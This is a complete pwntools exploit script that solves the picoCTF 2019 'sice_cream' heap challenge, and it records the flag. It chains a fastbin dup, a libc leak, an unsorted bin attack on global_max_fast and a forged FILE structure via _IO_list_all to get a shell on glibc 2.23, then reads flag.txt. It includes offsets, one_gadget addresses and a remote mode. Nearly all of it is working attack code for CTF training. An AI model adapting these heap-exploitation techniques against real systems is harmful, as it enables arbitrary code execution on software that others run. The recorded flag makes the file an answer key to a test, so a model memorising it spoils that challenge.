#!/usr/bin/env python3
# 55 - sice_cream  (Binary Exploitation, picoCTF 2019)
# Flag: academy{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_Bb8E80eA}
# Write-up: ../../../writeups/binary-exploitation/55-sice-cream.md
# This is the script that produced the flag; historical variants are in archive/.
#
# sice_cream (CyLab 55) — FSOP final
#
# Primitives (toutes mesurées) :
#   * fastbin dup -> creams[] = arbitrary pointers -> arbitrary free
#   * fake unsorted chunk in name[] -> libc leak (main_arena+0x58)
#   * unsorted bin attack -> global_max_fast = unsorted_chunks (huge)
#   * with gmf huge, free() of a forged-size chunk pushes its chunk pointer into any
#     &fastbinsY[idx] = main_arena + 8 + 8*idx  -> arbitrary heap pointer write into libc
#   * idx 319 -> _IO_list_all ; the value written is the chunk pointer (heap+0xf0)
#
# Heap geometry (measured with /proc/pid/mem):
#   grooming buy #0 -> BSS leftover unsorted chunk (0x602050)
#   grooming buy #k>=1 -> heap + 0xd0 + (k-1)*0x50
#   chunk k user data = [heap+0xd0+(k-1)*0x50 , +0x48)
#   chunk k size field = heap+0xc8+(k-1)*0x50 (== 0x51, not writable)
import os, sys, struct, time
from pwn import *

context.log_level = os.environ.get('LOG', 'error')
context.arch = 'amd64'
LOG = context.log_level

OFF_UNSORTED   = 0x3c4b78
OFF_GMF        = 0x3c67f8
OFF_IO_LIST    = 0x3c5520
OFF_SYSTEM     = 0x45390
ONE_GADGETS    = [0x4526a, 0xf02a4, 0xf1147, 0x45216]
FAKE_FAST      = 0x602120
CREAMS         = 0x602140
GROOM_BASE     = 0xd0        # user ptr of groom chunk #1
NCHUNK         = 78          # groom chunks #1..#77

# fake FILE at C_f = heap + 0xf0  (16-aligned, j=2 -> no size field collides)
CF             = 0xf0
F_CHUNKSIZE    = 0x08        # *(C_f+8) = fastbin size -> idx 319 (_IO_list_all)
SFS            = 0x1410
F_WBASE        = 0x20
F_WPTR         = 0x28        # == chunk2 size field == 0x51
F_BUFBASE      = 0x38        # -> pointer to "sh"
F_CHAIN        = 0x68
F_VTOFF        = 0x82
F_MODE         = 0xc0
F_VTABLE       = 0xd8
F_FREEBUF      = 0xe8
V_OFF          = 0x180       # fake vtable address - heap ; V+0x18 = __overflow
STR_OFF        = 0x1f0       # "sh" string - heap
NEXTSZ_OFF     = 0x1508      # C_f + SFS + 8

p = None
pid = None

def peek(addr, n):
    if pid is None:
        return None
    try:
        with open('/proc/%d/mem' % pid, 'rb') as f:
            f.seek(addr)
            return f.read(n)
    except Exception:
        return None

def q(addr):
    d = peek(addr, 8)
    return u64(d) if d and len(d) == 8 else None

def creams_now():
    d = peek(CREAMS, 160)
    return list(struct.unpack('<20Q', d)) if d and len(d) == 160 else None

def start(mode='local', host=None, port=None):
    global p, pid
    if mode == 'remote':
        p = remote(host, int(port)); pid = None
    else:
        p = process(['./ld-2.23.so', '--library-path', '.', './sice_cream'],
                    cwd=os.environ.get('WD', './_z_55'),
                    stderr=process.STDOUT)
        pid = p.pid

def buy(size, data):
    p.recvuntil(b'> '); p.send(b'1\n')
    p.recvuntil(b'> '); p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Here you go!')

def eat(idx, wait=True):
    p.recvuntil(b'> '); p.send(b'2\n')
    p.recvuntil(b'> '); p.send(str(idx).encode() + b'\n')
    if wait:
        return p.recvuntil(b'Yum!', timeout=5)

def reintro(data):
    p.recvuntil(b'> '); p.send(b'3\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Ah, right! How could a forget a name like ')
    return p.recvuntil(b'!', timeout=5)

def nbytes(hdrs, fill=b'A'):
    nm = bytearray(fill * 0x100)
    for off, val in hdrs.items():
        nm[off:off + 8] = p64(val)
    return bytes(nm)

def exploit(ovf_name):
    # ---------- stage 1a: heap leak ----------
    nm = bytearray(b'A' * 0x100)
    nm[0xf0:0xf8] = p64(0); nm[0xf8:0x100] = p64(0x60)
    p.recvuntil(b'Whats your name?'); p.recvuntil(b'> ')
    p.send(bytes(nm))
    buy(0x58, b'A' * 0x58)
    buy(0x58, b'B' * 0x58)
    out = reintro(b'A' * 0x100)
    # printf stops at the first NUL byte: the heap may live below 2^32 remotely, so the
    # leaked pointer can be as short as 4 bytes. Missing high bytes are zero.
    hp = out[:-1][0x100:0x106]
    if len(hp) < 4:
        log.warning("heap leak short: out=%r (len=%d)" % (out, len(out))); return None
    heap = u64(hp + b'\x00' * (8 - len(hp))) - 0x10
    if heap & 0xfff:
        log.warning("heap misaligned %#x (raw %r)" % (heap, hp)); return None
    log.info("heap = %#x" % heap)
    reintro(nbytes({0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))

    # ---------- stage 1b: fastbin dup -> creams[] ----------
    eat(0); eat(1); eat(0)
    buy(0x58, p64(FAKE_FAST))
    buy(0x58, b'D' * 0x58)
    buy(0x58, p64(0) + p64(0x61) + p64(FAKE_FAST) + b'E' * 0x40)
    buy(0x58, p64(0) * 2 + p64(FAKE_FAST) + p64(0x602050) + p64(0) * 7)

    # ---------- stage 1c: libc leak ----------
    reintro(nbytes({0x08: 0x91, 0x98: 0x21, 0xb8: 0x21, 0xe8: 0x61,
                    0xf0: FAKE_FAST, 0xf8: 0x60}))
    eat(1)
    out = reintro(b'B' * 0x10)
    ptr = out[0x10:0x16]
    if len(ptr) < 4:
        log.warning("libc leak short: %r" % out); return None
    libc = u64(ptr + b'\x00' * (8 - len(ptr))) - OFF_UNSORTED
    if libc & 0xfff:
        log.warning("libc misaligned %#x (raw %r)" % (libc, ptr)); return None
    log.success("libc = %#x" % libc)
    unsorted  = libc + OFF_UNSORTED
    gmf       = libc + OFF_GMF
    io_list   = libc + OFF_IO_LIST
    system    = libc + OFF_SYSTEM

    if ovf_name == 'sys':
        ovf = system
    else:
        ovf = libc + ONE_GADGETS[int(ovf_name[1:])]
    log.info("overflow fn = %#x (gmf=%#x io_list_all=%#x)" % (ovf, gmf, io_list))

    reintro(nbytes({0x00: 0, 0x08: 0x91, 0x10: 0, 0x18: unsorted,
                    0x90: 0x90, 0x98: 0x21, 0xb8: 0x21, 0xe8: 0x61,
                    0xf0: FAKE_FAST, 0xf8: 0x60}))

    creams = [0] * 20
    creams[0] = FAKE_FAST
    creams[1] = 0x602050
    def reset(final=False):
        pay = [FAKE_FAST, 0, FAKE_FAST, 0, 0, 0, 0, 0, 0, 0, 0]
        if final:
            # creams[1] = pointer to free last (fake FILE chunk), [2]/[3] = gmf stage
            pay = [FAKE_FAST, 0, FAKE_FAST, heap + CF + 0x10, 0x602050, 0x602080, 0, 0, 0, 0, 0]
        buy(0x58, b''.join(p64(x) for x in pay))
        vals = pay[2:] + [0, 0]
        for i in range(9):
            creams[i] = vals[i]

    # ---------- payload map for the groom chunks ----------
    payloads = {}
    def put(addr, data):
        d = addr - heap
        k = (d - GROOM_BASE) // 0x50 + 1
        off = d - (GROOM_BASE + (k - 1) * 0x50)
        if not (0 <= off < 0x48):
            raise ValueError("bad placement %#x -> chunk %d off %#x" % (d, k, off))
        if not (1 <= k <= NCHUNK - 1):
            raise ValueError("chunk %d out of range" % k)
        buf = payloads.setdefault(k, bytearray(b'\x00' * 0x48))
        buf[off:off + len(data)] = data
        return k

    put(heap + CF + F_CHUNKSIZE, p64(SFS))
    put(heap + CF + F_WBASE,     p64(0))
    put(heap + CF + F_BUFBASE,   p64(heap + STR_OFF))
    put(heap + CF + F_CHAIN,     p64(0))
    put(heap + CF + F_VTOFF,     p8(0))
    put(heap + CF + F_MODE,      p32(0))
    put(heap + CF + F_VTABLE,    p64(heap + V_OFF))
    put(heap + CF + F_FREEBUF,   p64(system))
    put(heap + V_OFF + 0x18,     p64(ovf))
    put(heap + STR_OFF,          b'sh\x00')
    put(heap + NEXTSZ_OFF,       p64(0x51))
    if LOG != 'error':
        for k in sorted(payloads):
            log.info("payload chunk %d: %s" % (k, bytes(payloads[k]).hex()))

    # ---------- heap grooming ----------
    made = 0
    while made < NCHUNK:
        free_low = [i for i in range(9) if creams[i] == 0]
        if len(free_low) < 2:
            reset()
            free_low = [i for i in range(9) if creams[i] == 0]
        s = free_low[0]
        data = bytes(payloads.get(made, b'\x00' * 0x48))
        buy(0x48, data)
        creams[s] = 1
        made += 1
    log.info("groomed %d chunks" % made)
    if pid:
        c = [q(heap + CF + o) for o in (0x08, 0x110, 0x118, 0x128, 0x158, 0x172, 0x198, 0x1b0, 0x1c8, 0x1d8)]
        log.info("fake FILE fields: %r" % [hex(x) if x is not None else None for x in c])
        log.info("nextsize@%#x = %#x" % (heap + NEXTSZ_OFF, q(heap + NEXTSZ_OFF) or 0))

    # ---------- final reset: creams[1] = C_f+0x10 ----------
    reset(final=True)
    if pid:
        c = creams_now()
        log.info("creams = %r" % (c,))
        assert c[1] == heap + CF + 0x10

    # ---------- stage 2a: global_max_fast = unsorted ----------
    reintro(nbytes({0x08: 0x91, 0x38: 0x91, 0x98: 0x21, 0xb8: 0x21,
                    0xc8: 0x21, 0xd8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))
    eat(2)
    eat(3)
    reintro(nbytes({0x08: 0x51, 0x10: 0, 0x18: gmf - 0x10, 0x50: 0x50, 0x58: 0x21,
                    0x38: 0x91, 0x88: unsorted,
                    0x98: 0x21, 0xb8: 0x21, 0xc8: 0x21, 0xd8: 0x21, 0xe8: 0x61,
                    0xf0: FAKE_FAST, 0xf8: 0x60}))
    buy(0x48, b'Q' * 0x48)
    if pid:
        log.info("gmf = %#x (want %#x)" % (q(gmf) or 0, unsorted))

    # ---------- stage 2b: free(C_f+0x10) -> _IO_list_all = C_f ----------
    eat(1)
    if pid:
        log.info("_IO_list_all = %#x (want %#x)  alive=%r" %
                 (q(io_list) or 0, heap + CF, p.poll() is None))

    # ---------- trigger exit ----------
    p.send(b'4\n')
    return True

def attempt(ovf_name, mode, host, port):
    global p, pid
    if p:
        try: p.close()
        except Exception: pass
    p = None; pid = None
    start(mode, host, port)
    try:
        exploit(ovf_name)
    except EOFError:
        log.warning("%s: EOF" % ovf_name); return False
    except Exception as e:
        log.warning("%s: %r" % (ovf_name, e)); return False
    try:
        time.sleep(0.5)
        p.sendline(b'echo ---PWNED---; cat flag.txt; exit')
        out = p.recvrepeat(4)
        sys.stdout.write(out.decode('latin1'))
        if b'PWNED' in out or b'academy{' in out or b'FLAGTEST' in out:
            print("[+] SHELL via %s" % ovf_name)
            return True
    except Exception as e:
        log.warning("shell: %r" % e)
    return False

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    host = sys.argv[2] if len(sys.argv) > 2 else None
    port = sys.argv[3] if len(sys.argv) > 3 else None
    choice = os.environ.get('OVF')
    names = [choice] if choice else ['g0', 'g1', 'g2', 'g3', 'sys']
    for n in names:
        if attempt(n, mode, host, port):
            return
    print("[-] no shell")

if __name__ == '__main__':
    main()
